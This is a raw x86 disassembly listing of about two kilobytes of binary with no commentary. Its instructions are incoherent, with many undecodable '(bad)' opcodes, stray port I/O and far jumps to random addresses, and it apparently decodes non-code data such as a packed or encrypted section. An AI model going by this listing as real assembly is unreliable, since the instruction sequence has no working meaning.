  415ae4:	adc    al,0xdb
  415ae6:	push   eax
  415ae7:	push   es
  415ae8:	mov    bl,ah
  415aea:	fs mov ebp,0x1f819d89
  415af0:	xchg   DWORD PTR [eax],edx
  415af2:	inc    ecx
  415af3:	dec    edi
  415af4:	push   edx
  415af5:	fwait
  415af6:	out    dx,al
  415af7:	xchg   BYTE PTR [esi-0x62],bh
  415afa:	arpl   WORD PTR [bx+si],di
  415afd:	jmp    0x27b6ab33
  415b02:	fiadd  DWORD PTR [esi-0x42]
  415b05:	mov    al,ds:0xc97c02d2
  415b0a:	pop    esp
  415b0b:	sub    al,0xa6
  415b0d:	pop    ebx
  415b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0f:	aas    
  415b10:	lods   al,BYTE PTR ds:[esi]
  415b11:	mov    bh,0xad
  415b13:	sub    BYTE PTR ds:0xa7309882,bh
  415b19:	(bad)  
  415b1a:	xchg   edi,eax
  415b1b:	jne    0x415ae2
  415b1d:	sub    DWORD PTR [esi-0x33],0x2eea3396
  415b24:	setno  BYTE PTR [ebp-0x60]
  415b28:	ins    BYTE PTR es:[edi],dx
  415b29:	jge    0x415b2a
  415b2b:	test   edx,0x287fb005
  415b31:	lds    esi,FWORD PTR [eax+0xe5c6dd7]
  415b37:	fld    QWORD PTR [eax+esi*4]
  415b3a:	mov    bl,0xae
  415b3c:	repnz test eax,0xae52312e
  415b42:	inc    ecx
  415b43:	sti    
  415b44:	mov    ds:0x2cda6c9b,eax
  415b49:	mov    BYTE PTR [ebp+0x6],bl
  415b4c:	imul   ecx,DWORD PTR [edi],0x63e10ef0
  415b52:	sbb    BYTE PTR [ebx-0xc],cl
  415b55:	or     BYTE PTR [eax-0x3c],0xee
  415b59:	mov    eax,0xf168ef9a
  415b5e:	and    BYTE PTR [ecx],dl
  415b60:	xor    DWORD PTR [ebx-0x79],esi
  415b63:	mov    ebx,0x6b2535e2
  415b68:	xor    DWORD PTR [ebx],esp
  415b6a:	and    ah,ch
  415b6c:	and    esp,DWORD PTR [eax+0x5ee8c273]
  415b72:	icebp  
  415b73:	lods   eax,DWORD PTR ds:[esi]
  415b74:	dec    esp
  415b75:	rcl    DWORD PTR [esp+ebp*2],0x88
  415b79:	lea    esi,[esp+ebp*4+0x31d759f4]
  415b80:	xor    eax,0xf9341370
  415b85:	mov    ?,WORD PTR [eax]
  415b87:	bswap  edi
  415b89:	cmp    cl,BYTE PTR [edx]
  415b8b:	or     ebp,ecx
  415b8d:	js     0x415b32
  415b8f:	sub    ecx,DWORD PTR [esi-0x44b6cfcb]
  415b95:	jo     0x415b3d
  415b97:	jmp    0x8c304435
  415b9c:	sub    al,0xcb
  415b9e:	scas   al,BYTE PTR es:[edi]
  415b9f:	add    DWORD PTR [edi+0x48674646],eax
  415ba5:	push   eax
  415ba6:	(bad)  
  415ba7:	sub    DWORD PTR [esi-0xe],ecx
  415baa:	add    eax,0xa379e947
  415baf:	sahf   
  415bb0:	(bad)  
  415bb1:	in     eax,dx
  415bb2:	or     ah,bl
  415bb4:	add    eax,0x2811613a
  415bb9:	jmp    0x415b7a
  415bbb:	mov    esi,0xd48378a8
  415bc0:	jge    0x415c22
  415bc2:	xchg   ecx,eax
  415bc3:	jne    0x415b6f
  415bc5:	fucomip st,st(4)
  415bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bc8:	mov    esp,0x24e4de08
  415bcd:	jecxz  0x415c28
  415bcf:	and    DWORD PTR [ecx],0x2792957c
  415bd5:	psubq  mm2,QWORD PTR [ecx-0x35]
  415bd9:	push   ds
  415bda:	pop    esp
  415bdb:	jl     0x415c16
  415bdd:	pop    ss
  415bde:	mov    eax,0x8146003
  415be3:	pop    esp
  415be4:	cs pop esi
  415be6:	xchg   ecx,eax
  415be7:	pop    ds
  415be8:	arpl   WORD PTR [edx-0x585e46c1],di
  415bee:	clc    
  415bef:	push   es
  415bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf1:	push   0xbe541a58
  415bf6:	out    dx,eax
  415bf7:	out    0x1b,eax
  415bf9:	xlat   BYTE PTR ds:[ebx]
  415bfa:	imul   edx,DWORD PTR [ecx-0x24a3e878],0x9e3a9edc
  415c04:	inc    eax
  415c05:	dec    eax
  415c06:	pop    esi
  415c07:	pop    ebx
  415c08:	jle    0x415ba5
  415c0a:	les    edi,FWORD PTR ds:0x55c5120a
  415c10:	cmc    
  415c11:	in     eax,0x4d
  415c13:	repz mov al,0x2b
  415c16:	sub    dh,BYTE PTR gs:[ebx]
  415c19:	add    BYTE PTR [eax-0x80],al
  415c1c:	bound  eax,QWORD PTR [ebx-0x4]
  415c1f:	out    0xbb,eax
  415c21:	inc    edi
  415c22:	sbb    BYTE PTR [eax-0x5b],bl
  415c25:	fbstp  TBYTE PTR [edi+0x7c]
  415c28:	in     eax,0xf7
  415c2a:	mov    dh,BYTE PTR [ebp-0x6eeb71c1]
  415c30:	repnz cwde 
  415c32:	neg    BYTE PTR [esi+0x2cde1cd0]
  415c38:	add    DWORD PTR [eax+ebp*1+0x1d],0xa4093459
  415c40:	mov    esi,0x7dd07c20
  415c45:	fbld   TBYTE PTR [edx+eax*1]
  415c48:	nop
  415c49:	xor    ebx,eax
  415c4b:	test   eax,ebx
  415c4d:	mov    ebp,DWORD PTR [eax-0x7c]
  415c50:	dec    eax
  415c51:	adc    edi,esp
  415c53:	pop    edx
  415c54:	push   ebx
  415c55:	jne    0x415be4
  415c57:	in     al,dx
  415c58:	scas   eax,DWORD PTR es:[edi]
  415c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c5a:	aaa    
  415c5b:	jae    0x415be0
  415c5d:	shr    DWORD PTR [ecx+0x28],cl
  415c60:	mov    ds:0xd2b25d07,al
  415c65:	jp     0x415cde
  415c67:	popf   
  415c68:	xchg   BYTE PTR [ecx],ch
  415c6a:	mov    BYTE PTR [edx+0x1d],cl
  415c6d:	push   ds
  415c6e:	mov    BYTE PTR [esi-0x2635031a],dh
  415c74:	jle    0x415c41
  415c76:	icebp  
  415c77:	cs push cs
  415c79:	sub    BYTE PTR [esi+0x7bb3ff5f],cl
  415c7f:	or     eax,0x978064e6
  415c84:	adc    ebp,DWORD PTR [ebp+0x112d1e80]
  415c8a:	add    bh,BYTE PTR [edx-0xf]
  415c8d:	aaa    
  415c8e:	mov    dl,0xea
  415c90:	cmp    bh,BYTE PTR [esi-0x303fcc4b]
  415c96:	mov    dh,0x6b
  415c98:	add    BYTE PTR ds:[edx-0x26],al
  415c9c:	ins    BYTE PTR es:[edi],dx
  415c9d:	inc    ecx
  415c9e:	sbb    eax,ebx
  415ca0:	cwde   
  415ca1:	mov    ds:0xc63e0e93,al
  415ca6:	retf   0x6c5b
  415ca9:	adc    bh,bh
  415cab:	sub    BYTE PTR ds:[esi],0xb
  415caf:	jnp    0x415ce0
  415cb1:	rol    BYTE PTR [edx+0x208a1821],cl
  415cb7:	push   esi
  415cb8:	and    eax,DWORD PTR [ecx]
  415cba:	sbb    edi,DWORD PTR [eax-0x5e]
  415cbd:	nop
  415cbe:	mov    eax,0xf65f4e3b
  415cc3:	fwait
  415cc4:	enter  0x41a,0x89
  415cc8:	inc    esi
  415cc9:	cmc    
  415cca:	jbe    0x415c8d
  415ccc:	xor    al,0xb7
  415cce:	sbb    al,0x10
  415cd0:	stc    
  415cd1:	fcomp  DWORD PTR [edi+0x326d37de]
  415cd7:	fimul  WORD PTR [ecx]
  415cd9:	pop    ds
  415cda:	out    dx,al
  415cdb:	and    ch,BYTE PTR ds:0xe37ac5cc
  415ce1:	push   0xffffff85
  415ce3:	data16 jns 0x415cf9
  415ce6:	int    0x96
  415ce8:	shl    DWORD PTR [edx],cl
  415cea:	cmp    esi,DWORD PTR [esi+0x63c339e7]
  415cf0:	xchg   ebx,eax
  415cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cf2:	pop    esi
  415cf3:	xchg   BYTE PTR [edi-0x32],ah
  415cf6:	js     0x415c89
  415cf8:	jl     0x415d38
  415cfa:	shl    BYTE PTR [ebp-0x7e],cl
  415cfd:	jnp    0x415d13
  415cff:	xor    eax,0x7f65e747
  415d04:	pop    edx
  415d05:	adc    al,BYTE PTR [edi]
  415d07:	sub    BYTE PTR [edx-0x440d3536],cl
  415d0d:	mov    esi,0x9ff137c8
  415d12:	in     al,dx
  415d13:	jmp    0x7be2:0xda82fe28
  415d1a:	dec    esp
  415d1b:	or     al,0x84
  415d1d:	shr    BYTE PTR [ebx-0x679e2dbd],cl
  415d23:	jl     0x415d37
  415d25:	lds    edx,FWORD PTR [ecx]
  415d27:	mov    ebp,0xaa6f7407
  415d2c:	imul   edi,edi,0x21
  415d2f:	sysenter 
  415d31:	nop
  415d32:	jne    0x415d3f
  415d34:	adc    ah,BYTE PTR [edx]
  415d36:	push   0xffffffac
  415d38:	pop    edx
  415d39:	inc    ebp
  415d3a:	xor    eax,0x6ef3a369
  415d3f:	aam    0x8f
  415d41:	inc    edi
  415d42:	stc    
  415d43:	pop    edi
  415d44:	fadd   st,st(6)
  415d46:	sub    DWORD PTR [esi-0x608b5a80],0xfffffffe
  415d4d:	sub    ah,BYTE PTR [edx+0x41]
  415d50:	mov    al,0x6b
  415d52:	or     ch,BYTE PTR [ecx-0x7f]
  415d55:	mov    ebx,DWORD PTR [edi]
  415d57:	mov    eax,ds:0x1ff7becf
  415d5c:	jge    0x415d6c
  415d5e:	dec    ebx
  415d5f:	into   
  415d60:	jge    0x415d78
  415d62:	mov    dh,0x61
  415d64:	mov    ebp,0xe176fa01
  415d69:	pop    ecx
  415d6a:	shl    ch,1
  415d6c:	test   eax,0x591657e3
  415d71:	stos   DWORD PTR es:[edi],eax
  415d72:	xor    al,0x62
  415d74:	push   es
  415d75:	pop    edi
  415d76:	mov    eax,es
  415d78:	ins    DWORD PTR es:[edi],dx
  415d79:	add    al,0xf6
  415d7b:	mov    DWORD PTR [ebp-0x1b],0x6cb1555f
  415d82:	ins    BYTE PTR es:[edi],dx
  415d83:	or     cl,BYTE PTR [eax+edi*4+0x5a8a4814]
  415d8a:	cmp    DWORD PTR [esi+0x14885120],0x1d
  415d91:	jge    0x415d8c
  415d93:	add    al,0x24
  415d95:	addr16 ret 
  415d97:	das    
  415d98:	mov    dh,0xf4
  415d9a:	rol    BYTE PTR [ebp-0x8ed0752],cl
  415da0:	dec    edi
  415da1:	pop    ds
  415da2:	in     eax,dx
  415da3:	or     eax,0x4e34d100
  415da8:	mov    edi,0x99a8bba
  415dad:	dec    edx
  415dae:	fild   QWORD PTR es:[eax+0x382691c0]
  415db5:	stos   BYTE PTR es:[edi],al
  415db6:	and    DWORD PTR [eax+0x414d3d06],esp
  415dbc:	ret    0x9b19
  415dbf:	fadd   QWORD PTR [edx+0x2a]
  415dc2:	xor    BYTE PTR [edx-0xe],bh
  415dc5:	inc    ebx
  415dc6:	scas   al,BYTE PTR es:[edi]
  415dc7:	mov    ah,0xf1
  415dc9:	fs jbe 0x415e3b
  415dcc:	xchg   ebp,eax
  415dcd:	stos   DWORD PTR es:[edi],eax
  415dce:	pop    ebp
  415dcf:	into   
  415dd0:	xchg   ecx,eax
  415dd1:	aas    
  415dd2:	popa   
  415dd3:	xor    edi,DWORD PTR [esp+ecx*4-0x2]
  415dd7:	shl    BYTE PTR [esi+0x79],0xc7
  415ddb:	mov    ds:0x523f34b9,al
  415de0:	cld    
  415de1:	sub    DWORD PTR [eax],eax
  415de3:	xchg   BYTE PTR [ecx+0x3],dl
  415de6:	retf   
  415de7:	mov    edx,0xbcedd18e
  415dec:	jecxz  0x415dc3
  415dee:	mov    WORD PTR [edx+0x5a],fs
  415df1:	imul   ebp,DWORD PTR [ecx+ebx*8],0x7ebc9f85
  415df8:	mov    esp,DWORD PTR [ebp-0x1d]
  415dfb:	xchg   BYTE PTR [ecx-0x4],ah
  415dfe:	test   edx,esi
  415e00:	test   DWORD PTR [edi-0x3f],ebx
  415e03:	add    bh,BYTE PTR [ebx+0x252a5141]
  415e09:	scas   eax,DWORD PTR es:[edi]
  415e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e0b:	inc    ebp
  415e0c:	daa    
  415e0d:	and    eax,0xa547ee13
  415e12:	or     dh,bl
  415e14:	out    0x59,eax
  415e16:	outs   dx,BYTE PTR ds:[esi]
  415e17:	test   al,0xdc
  415e19:	mov    DWORD PTR [esi-0x4],ebx
  415e1c:	addr16 cmp al,0x1d
  415e1f:	leave  
  415e20:	cmp    edx,DWORD PTR [ebp+0x36]
  415e23:	lea    edi,[ebx-0x42]
  415e26:	mov    cl,BYTE PTR [eax-0xe]
  415e29:	push   ebp
  415e2a:	stc    
  415e2b:	dec    eax
  415e2c:	stos   BYTE PTR es:[edi],al
  415e2d:	cdq    
  415e2e:	push   es
  415e2f:	pushf  
  415e30:	xor    eax,0x602f8b5b
  415e35:	aad    0xdc
  415e37:	add    eax,0xee355a03
  415e3c:	pushf  
  415e3d:	in     eax,0x80
  415e3f:	inc    ecx
  415e40:	mov    ebx,0xa7757c44
  415e45:	sub    al,0x67
  415e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e48:	xchg   DWORD PTR [ecx-0x6b],edx
  415e4b:	or     esi,edx
  415e4d:	ror    BYTE PTR [esi+0x50],0x2b
  415e51:	mov    dl,0x42
  415e53:	popa   
  415e54:	mov    WORD PTR [edi-0x282e15ad],?
  415e5a:	adc    al,0x8
  415e5c:	ror    BYTE PTR [ebp+edi*8+0x2937427],1
  415e63:	mov    ds:0xcaf651ac,eax
  415e68:	aad    0x5b
  415e6a:	adc    edi,ecx
  415e6c:	fild   DWORD PTR ds:0x7f7bf013
  415e72:	fstp   DWORD PTR [ebp+0x5a]
  415e75:	and    bl,BYTE PTR [ebp+0x59]
  415e78:	cs hlt 
  415e7a:	aam    0xd3
  415e7c:	sti    
  415e7d:	retf   
  415e7e:	ffreep st(4)
  415e80:	push   0x5d
  415e82:	sti    
  415e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e84:	pop    ecx
  415e85:	loopne 0x415ea5
  415e87:	dec    ecx
  415e88:	adc    eax,0xe63c4c0e
  415e8d:	push   0x75fd5e9b
  415e92:	mov    ah,0xf1
  415e94:	in     eax,0x55
  415e96:	sub    BYTE PTR [eax+0x6c],al
  415e99:	adc    ah,BYTE PTR [ebx]
  415e9b:	adc    ch,BYTE PTR [esi+0x4b]
  415e9e:	push   ecx
  415e9f:	cwde   
  415ea0:	pop    es
  415ea1:	add    ebp,ecx
  415ea3:	out    dx,al
  415ea4:	loop   0x415ec9
  415ea6:	xchg   esp,eax
  415ea7:	sti    
  415ea8:	icebp  
  415ea9:	push   esi
  415eaa:	mov    gs,WORD PTR [ecx-0x16]
  415ead:	mov    bl,0x1d
  415eaf:	add    al,0xaf
  415eb1:	sub    DWORD PTR [eax-0x29],ebp
  415eb4:	lock xlat BYTE PTR ds:[ebx]
  415eb6:	fild   WORD PTR ds:0x7d857393
  415ebc:	inc    ebx
  415ebd:	mov    edi,0x1f07a8c9
  415ec2:	sar    DWORD PTR [edx],0xa6
  415ec5:	mov    dh,0x73
  415ec7:	push   ss
  415ec8:	dec    ebx
  415ec9:	sbb    al,0xc4
  415ecb:	xchg   ebp,eax
  415ecc:	aaa    
  415ecd:	sub    BYTE PTR ds:0x796bc991,ch
  415ed3:	xlat   BYTE PTR ds:[ebx]
  415ed4:	ss and eax,0x5a1f02f3
  415eda:	test   BYTE PTR [edx],dl
  415edc:	test   eax,0xe457038a
  415ee1:	dec    edi
  415ee2:	xchg   BYTE PTR [ecx-0x48],dh
  415ee5:	push   ebp
  415ee6:	xor    BYTE PTR [edx-0x6092fb7f],cl
  415eec:	stos   BYTE PTR es:[edi],al
  415eed:	xchg   BYTE PTR [edx+0x60d77cc0],ch
  415ef3:	push   eax
  415ef4:	ins    BYTE PTR es:[edi],dx
  415ef5:	retf   
  415ef6:	loope  0x415eba
  415ef8:	lahf   
  415ef9:	je     0x415f55
  415efb:	mov    ebp,0x5c0302b0
  415f00:	test   DWORD PTR [edx],eax
  415f02:	pushf  
  415f03:	inc    edi
  415f04:	ja     0x415f70
  415f06:	cmp    eax,0x19c7dcc7
  415f0b:	jb     0x415ec6
  415f0d:	mov    ds:0xe20b17a0,eax
  415f12:	(bad)  
  415f13:	cmp    ch,BYTE PTR [edi+0x3c4d2db1]
  415f19:	aaa    
  415f1a:	loope  0x415f0a
  415f1c:	fidiv  DWORD PTR ds:0xa2d6a2ba
  415f22:	jmp    FWORD PTR [ebp+0x5322c66c]
  415f28:	or     bh,BYTE PTR [ebx-0x506395a0]
  415f2e:	pop    edi
  415f2f:	pop    es
  415f30:	cmp    BYTE PTR [ecx],ah
  415f32:	inc    ebp
  415f33:	push   es
  415f34:	jne    0x415f0e
  415f36:	outs   dx,DWORD PTR ds:[esi]
  415f37:	push   edx
  415f38:	cli    
  415f39:	enter  0x254a,0xa
  415f3d:	mov    esp,0xf6e4817d
  415f42:	jae    0x415f0c
  415f44:	adc    dl,BYTE PTR [edx+0x4c]
  415f47:	lea    esp,[ebp-0x54187a10]
  415f4d:	jo     0x415ef6
  415f4f:	into   
  415f50:	pusha  
  415f51:	sbb    eax,0x563f1870
  415f56:	jb     0x415f7a
  415f58:	mov    bh,0xa0
  415f5a:	or     BYTE PTR [edi-0x49],0xf7
  415f5e:	js     0x415f40
  415f60:	pop    eax
  415f61:	idiv   DWORD PTR [ecx-0x67]
  415f64:	popf   
  415f65:	mov    ah,0x50
  415f67:	imul   edx,DWORD PTR [edx-0x367b0880],0x70
  415f6e:	cs mov bl,0xce
  415f71:	adc    eax,0x7da252be
  415f76:	mov    esi,?
  415f78:	shr    BYTE PTR [esi+0x232a7842],1
  415f7e:	mov    dh,0x83
  415f80:	xor    DWORD PTR [eax],esp
  415f82:	js     0x415fef
  415f84:	aas    
  415f85:	inc    eax
  415f86:	push   eax
  415f87:	out    dx,eax
  415f88:	and    eax,DWORD PTR [edx]
  415f8a:	mov    al,ds:0xc0c29e6b
  415f8f:	mov    ds:0x770c1eb7,al
  415f94:	sbb    ecx,ebp
  415f96:	sub    ecx,DWORD PTR [esi+0x50e04f4e]
  415f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f9d:	mov    dl,0x53
  415f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fa0:	or     BYTE PTR [edi],al
  415fa2:	ret    0xebfb
  415fa5:	neg    BYTE PTR [edx+0x7a]
  415fa8:	popf   
  415fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415faa:	add    al,0xde
  415fac:	ss xchg ebp,eax
  415fae:	aad    0xff
  415fb0:	retf   
  415fb1:	mov    dh,0x2f
  415fb3:	out    0xd,eax
  415fb5:	ins    DWORD PTR es:[edi],dx
  415fb6:	xlat   BYTE PTR ds:[ebx]
  415fb7:	cmp    edi,edx
  415fb9:	add    DWORD PTR [ebx+ebp*1],eax
  415fbc:	mov    esp,0xbfa587e
  415fc1:	push   0x63
  415fc3:	cmp    ebp,DWORD PTR [eax-0x6d]
  415fc6:	vpunpcklwd ymm1,ymm2,YMMWORD PTR [ebx+0xf]
  415fcb:	push   DWORD PTR [ebx+0x4e34b8b1]
  415fd1:	jbe    0x415f8f
  415fd3:	retf   0xf276
  415fd6:	mov    ch,0x94
  415fd8:	(bad)  
  415fd9:	aad    0xda
  415fdb:	inc    esp
  415fdc:	push   esp
  415fdd:	add    eax,0x5647ef10
  415fe2:	(bad)  [ebx-0xa]
  415fe5:	pop    esi
  415fe6:	iretw  
  415fe8:	jns    0x416061
  415fea:	mov    WORD PTR [ebp+ebp*8+0x54b14d92],?
  415ff1:	sbb    DWORD PTR [ebp-0x48b88dc2],ecx
  415ff7:	sahf   
  415ff8:	gs and BYTE PTR ss:0xe9c20b13,0x5
  416001:	dec    ebx
  416002:	mov    ebp,0x82c672fe
  416007:	cwde   
  416008:	jb     0x416055
  41600a:	iret   
  41600b:	lahf   
  41600c:	fs inc edx
  41600e:	lods   al,BYTE PTR ds:[esi]
  41600f:	dec    BYTE PTR [edx+0x2d6b2e23]
  416015:	jl     0x415fda
  416017:	and    al,0xaa
  416019:	sub    eax,0x85f6844c
  41601e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41601f:	cmp    DWORD PTR [ebx],0x148466ae
  416025:	mov    esp,0x8a37576c
  41602a:	addr16 and ah,ah
  41602d:	cmp    DWORD PTR [edx+ecx*4+0x43],ecx
  416031:	or     ch,0x53
  416034:	xchg   ecx,eax
  416035:	into   
  416036:	mov    esi,0x57517bea
  41603b:	lahf   
  41603c:	sar    DWORD PTR [esp+esi*4+0x3f],cl
  416040:	xor    eax,0x9d7a6d58
  416045:	bnd ret 0xb9ef
  416049:	lock xchg DWORD PTR [edi-0x5651883c],esi
  416050:	fs mov esp,0x636599f1
  416056:	popf   
  416057:	out    0xab,al
  416059:	repnz sbb ebp,DWORD PTR [edi-0x46]
  41605d:	sbb    ah,BYTE PTR [esi-0x23]
  416060:	jle    0x416018
  416062:	push   ebx
  416063:	adc    esi,esp
  416065:	sahf   
  416066:	xchg   esi,eax
  416067:	mov    al,0x4e
  416069:	pop    ecx
  41606a:	xchg   BYTE PTR [esi+0x0],ah
  41606d:	mov    dl,0xee
  41606f:	mov    al,0x7f
  416071:	int    0xdc
  416073:	mov    esp,0x60ea9e60
  416078:	mov    dl,0xb7
  41607a:	fs ins BYTE PTR es:[edi],dx
  41607c:	xor    ecx,DWORD PTR [esi]
  41607e:	jmp    0x2c5251ae
  416083:	enter  0x9c7a,0xc7
  416087:	jmp    0x3f1f:0xab071554
  41608e:	lods   al,BYTE PTR ds:[esi]
  41608f:	inc    eax
  416090:	enter  0x31ba,0x3c
  416094:	ftst   
  416096:	retf   
  416097:	adc    esi,DWORD PTR [ecx-0x78]
  41609a:	test   BYTE PTR [esi+0x306e6b26],cl
  4160a0:	stos   DWORD PTR es:[edi],eax
  4160a1:	add    DWORD PTR [ebx],0xffffffe7
  4160a4:	jb     0x4160bc
  4160a6:	or     BYTE PTR [esi+edx*4-0x76],cl
  4160aa:	lea    ebx,[ebx+0x784bc2b3]
  4160b0:	(bad)  
  4160b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b2:	retf   
  4160b3:	dec    esi
  4160b4:	xor    ebp,edi
  4160b6:	mov    ds:0xa06735ff,al
  4160bb:	pop    ds
  4160bc:	adc    esi,DWORD PTR [edi-0x7]
  4160bf:	gs iret 
  4160c1:	cmp    esp,ebp
  4160c3:	out    dx,eax
  4160c4:	xchg   BYTE PTR [eax],dl
  4160c6:	push   edx
  4160c7:	scas   al,BYTE PTR es:[edi]
  4160c8:	sub    BYTE PTR [ebp+0x3bbe8630],bl
  4160ce:	pop    eax
  4160cf:	and    DWORD PTR [edi],0xa400a77
  4160d5:	lds    ebp,FWORD PTR [esi+ebx*1+0x4e]
  4160d9:	mov    bl,0x60
  4160db:	repnz (bad) 
  4160dd:	repnz and al,0x51
  4160e0:	and    DWORD PTR [ebx],ebp
  4160e2:	push   es
  4160e3:	(bad)  
  4160e5:	ss into 
  4160e7:	out    dx,eax
  4160e8:	fldenv [ecx]
  4160ea:	or     ecx,0x827421d6
  4160f0:	jle    0x416108
  4160f2:	pop    edx
  4160f3:	pop    ebx
  4160f4:	mov    ch,0xd7
  4160f6:	cmp    BYTE PTR [eax-0xd],ch
  4160f9:	or     DWORD PTR [edx],ebx
  4160fb:	mov    cl,0xc3
  4160fd:	mov    cl,0xa6
  4160ff:	pop    ebx
  416100:	pusha  
  416101:	fst    QWORD PTR [ebp+0x306b1c0d]
  416107:	add    al,dh
  416109:	sbb    eax,0xbf3d53a3
  41610e:	call   0xd48a99bc
  416113:	xchg   DWORD PTR ds:0xcc4a6d6c,edi
  416119:	push   ebp
  41611a:	pop    edi
  41611b:	in     al,0x5b
  41611d:	or     al,0x20
  41611f:	add    DWORD PTR [ebx-0x1a],0x73a60edf
  416126:	repnz pop ebx
  416128:	xchg   ebx,eax
  416129:	fxch   st(2)
  41612b:	or     cl,BYTE PTR [ebx]
  41612d:	sub    BYTE PTR [esi+ebx*8+0x78],cl
  416131:	in     eax,dx
  416132:	test   BYTE PTR [ebp-0x1ae0c3d8],ah
  416138:	cmc    
  416139:	test   BYTE PTR [esi],dh
  41613b:	cs stos DWORD PTR es:[edi],eax
  41613d:	jmp    0x4160cf
  41613f:	sahf   
  416140:	fsub   QWORD PTR [ebx]
  416142:	int3   
  416143:	aas    
  416144:	(bad)  
  416146:	hlt    
  416147:	outs   dx,BYTE PTR ds:[esi]
  416148:	hlt    
  416149:	cld    
  41614a:	mov    dl,0xea
  41614c:	pop    esp
  41614d:	dec    eax
  41614e:	cmp    DWORD PTR [esi-0x7f3a377b],ebp
  416154:	repnz or al,0xad
  416157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416158:	fs inc eax
  41615a:	mov    ds:0x21e7652b,al
  41615f:	fwait
  416160:	(bad)  
  416161:	pushf  
  416162:	inc    esp
  416163:	cmp    BYTE PTR [ebx-0x6b],bl
  416166:	adc    eax,esi
  416168:	sbb    eax,0x5d7d615e
  41616d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41616e:	push   cs
  41616f:	jo     0x41613b
  416171:	pushf  
  416172:	sbb    eax,0xe6c47da5
  416177:	ret    0x277a
  41617a:	repz div DWORD PTR [edx+0x64]
  41617e:	addr16 iret 
  416180:	subps  xmm3,XMMWORD PTR [eax+0x7d]
  416184:	stos   DWORD PTR es:[edi],eax
  416185:	mov    al,ds:0xc13253a4
  41618a:	xchg   ebp,eax
  41618b:	int    0xfd
  41618d:	cmp    DWORD PTR [ebp-0x2b0ffe1a],edx
  416193:	inc    edi
  416194:	jno    0x416147
  416196:	loope  0x41612e
  416198:	mov    ebp,0x25e4d801
  41619d:	fld    TBYTE PTR [ebp-0x44bd90b4]
  4161a3:	jp     0x41612f
  4161a5:	cmc    
  4161a6:	xor    ch,BYTE PTR [edx+0x39]
  4161a9:	lock inc esi
  4161ab:	cmp    eax,0xcd7397a0
  4161b0:	mov    dh,0x64
  4161b2:	jecxz  0x41615e
  4161b4:	cmp    eax,0x3861cb32
  4161b9:	int3   
  4161ba:	mov    al,ds:0xa3232709
  4161bf:	or     BYTE PTR [edi-0x10],0x30
  4161c3:	je     0x41619e
  4161c5:	jge    0x416150
  4161c7:	add    ebp,DWORD PTR [eax-0x7a]
  4161ca:	mov    cs:0xb25e4e79,al
  4161d0:	mov    ds:0xecbfd2d8,eax
  4161d5:	adc    edi,0x8daae2c8
  4161db:	mov    BYTE PTR [edi],dh
  4161dd:	or     BYTE PTR [edi+0x52],0x14
  4161e1:	outs   dx,DWORD PTR ds:[esi]
  4161e2:	loope  0x416182
  4161e4:	fucom  st(1)
  4161e6:	cdq    
  4161e7:	and    al,0x2
  4161e9:	mov    dl,0x90
  4161eb:	clc    
  4161ec:	(bad)  [edx]
  4161ee:	sbb    eax,0x91aef763
  4161f3:	std    
  4161f4:	xchg   esi,eax
  4161f5:	mov    al,0x29
  4161f7:	mov    edx,0xe5c1235c
  4161fc:	or     ebx,eax
  4161fe:	sti    
  4161ff:	push   ss
  416200:	mov    ch,0xed
  416202:	xchg   ecx,eax
  416203:	popa   
  416204:	gs inc edx
  416206:	fcmovnu st,st(3)
  416208:	cld    
  416209:	std    
  41620a:	cmp    edi,DWORD PTR [ebp+0x9]
  41620d:	or     ah,ah
  41620f:	sbb    DWORD PTR [ebx+0x6539a67e],ecx
  416215:	mov    WORD PTR [eax-0x45597d8a],gs
  41621b:	jbe    0x41628d
  41621d:	je     0x4161aa
  41621f:	sub    DWORD PTR [edx+0x4e],ebp
  416222:	enter  0xd0,0x71
  416226:	and    al,0xba
  416228:	xor    al,0xe0
  41622a:	out    0x13,al
  41622c:	and    DWORD PTR [eax],ecx
  41622e:	xchg   DWORD PTR [ebx-0x3f],ebp
  416231:	(bad)  
  416233:	stos   BYTE PTR es:[edi],al
  416234:	scas   al,BYTE PTR es:[edi]
  416235:	ins    DWORD PTR es:[edi],dx
  416236:	mov    WORD PTR ds:0x8c8406dd,ds
  41623c:	adc    eax,0xfb3be1e7
  416241:	add    BYTE PTR [esi-0x5363ecd5],0xa7
  416248:	and    eax,0xa283f38a
  41624d:	jp     0x4161f7
  41624f:	(bad)
  416252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416253:	(bad)
  416257:	(bad)  
  416258:	push   ebx
  416259:	dec    esp
  41625a:	sub    dl,ah
  41625c:	ror    ch,1
  41625e:	div    BYTE PTR [ebp+0x647cb2d5]
  416264:	ret    0x6af8
  416267:	inc    ebp
  416268:	sbb    al,0x9f
  41626a:	addr16 neg cl
  41626d:	hlt    
  41626e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41626f:	and    eax,0x59bc6338
  416274:	sbb    DWORD PTR [edx+0x8df6e62],esp
  41627a:	sub    DWORD PTR [eax-0x4569382d],ecx
  416280:	adc    al,0x57
  416282:	dec    edi
  416283:	mov    ch,BYTE PTR [esi+0x13]
  416286:	pop    ebx
  416287:	les    edi,FWORD PTR [esi-0xfa7144c]
  41628d:	dec    ecx
  41628e:	mov    edx,0xdfcb87d4
  416293:	push   esp
  416295:	(bad)  
  416296:	lock xchg edi,eax
  416298:	lea    eax,[esi]
  41629a:	ret    
  41629b:	mov    ebp,0x41e127cb
  4162a0:	sbb    al,0xf2
  4162a2:	mov    ebp,0xd3d269cf
  4162a7:	jnp    0x4162e3
  4162a9:	fisubr DWORD PTR [esi-0x1]
  4162ac:	sbb    edi,DWORD PTR [ebx]
